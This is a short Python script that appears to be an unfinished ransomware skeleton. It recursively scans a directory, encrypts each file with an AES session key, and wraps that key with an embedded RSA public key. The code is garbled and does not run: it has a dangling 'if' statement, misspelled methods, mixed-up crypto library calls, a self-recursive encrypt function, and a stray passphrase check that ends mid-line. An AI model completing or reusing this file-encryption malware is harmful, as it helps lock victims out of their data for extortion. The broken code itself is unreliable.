import base64
import os
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from Crypto.Cipher import PKCS1_OAEP, AES

# Public key with base 64 encoding
if file == "keygn.py" or 
    continue

pubkey = '''Enter key'''
pubkey = base64.b64decode(pubkey)

# Function for directory scan

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
    else:
        yield from scanRecurse(entry.path)

# Function for encryption
def encrypt(dataFile, publicKey):
    # Read data from file
    extention = dataFile.suffix.loweer()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    # Convert data to bytes
    data = bytes(data)

    # Create public key

    key = rsa.import_key(publicKey)
    sessionKey = os.urandom(16)

    # Encrypting session key with public key
    cipher = padding.OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # Encrypt data with session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Save the encrypted data to file 
    encypt = encrypt(data)
    with open("encrypt","wb") as f:
        f.write(encrypt)


passphress =  "cofffe"
if usepasss == passphress:
